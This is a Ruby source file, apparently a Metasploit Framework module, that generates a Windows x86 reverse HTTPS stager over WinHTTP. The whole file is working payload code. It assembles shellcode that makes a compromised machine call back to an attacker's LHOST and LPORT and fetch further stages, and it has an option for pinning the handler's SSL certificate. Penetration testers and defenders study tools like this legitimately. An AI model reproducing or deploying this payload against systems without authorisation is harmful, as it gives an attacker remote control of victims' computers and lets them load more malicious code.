# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/reverse_winhttp'
require 'rex/parser/x509_certificate'

module Msf


###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTPS using WinHTTP
#
###


module Payload::Windows::ReverseWinHttps

  include Msf::Payload::Windows::ReverseWinHttp

  #
  # Register reverse_winhttps specific options
  #
  def initialize(*args)
    super
    register_advanced_options(
      [
        OptBool.new('StagerVerifySSLCert', [true, 'Whether to verify the SSL certificate hash in the handler', false])
      ], self.class)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_winhttps(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_winhttp(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Generate the first stage
  #
  def generate

    verify_cert = false
    verify_cert_hash = nil

    if datastore['StagerVerifySSLCert']
      unless datastore['HandlerSSLCert']
        raise ArgumentError, "StagerVerifySSLCert is enabled but no HandlerSSLCert is configured"
      else
        verify_cert = true
        hcert = Rex::Parser::X509Certificate.parse_pem_file(datastore['HandlerSSLCert'])
        unless hcert and hcert[0] and hcert[1]
          raise ArgumentError, "Could not parse a private key and certificate from #{datastore['HandlerSSLCert']}"
        end
        verify_cert_hash = Rex::Text.sha1_raw(hcert[1].to_der)
        print_status("Stager will verify SSL Certificate with SHA1 hash #{verify_cert_hash.unpack("H*").first}")
      end
    end

    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space

      if datastore['StagerVerifySSLCert']
        raise ArgumentError, "StagerVerifySSLCert is enabled but not enough payload space is available"
      end

      return generate_reverse_winhttps(
        ssl:  true,
        host: datastore['LHOST'],
        port: datastore['LPORT'],
        url:  generate_small_uri,
        verify_cert: verify_cert,
        verify_cert_hash: verify_cert_hash)
    end

    conf = {
      ssl:  true,
      host: datastore['LHOST'],
      port: datastore['LPORT'],
      url:  generate_uri,
      exitfunk: datastore['EXITFUNC'],
      verify_cert: verify_cert,
      verify_cert_hash: verify_cert_hash
    }

    generate_reverse_winhttps(conf)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    space = super

    # SSL support adds 20 bytes
    space += 20

    # SSL verification adds 120 bytes
    if datastore['StagerVerifySSLCert']
      space += 120
    end

    space
  end

end

end

